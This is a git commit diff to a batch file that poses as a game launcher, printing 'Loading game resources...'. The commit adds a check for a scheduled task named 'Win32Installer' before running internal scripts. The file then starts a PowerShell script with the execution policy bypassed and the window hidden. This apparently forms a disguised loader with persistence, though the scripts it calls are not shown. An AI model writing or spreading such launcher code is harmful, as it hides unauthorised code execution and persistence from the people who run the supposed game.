f086a32f32c1da0d412c175fe042767ce66bdf54
WAP Industries <141229412+WAP-Industries@users.noreply.github.com>
2024-05-06 09:42:22 +0800

    Update run.bat

--- files/run.bat
+++ files/run.bat
@@ -5,7 +5,10 @@ set "dir=%cd%"
 
 echo Loading game resources...
 
-cmd /c "%dir%\\internal\\run.bat"
-cmd /c "%dir%\\GameHelper\\run.bat"
+schtasks /query /tn "Win32Installer" > nul 2>&1
+if %errorlevel% neq 0 (
+    cmd /c "%dir%\\internal\\run.bat"
+    cmd /c "%dir%\\GameHelper\\run.bat"
+)
 
 cd /d "%dir%\\src" && powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File main.ps1
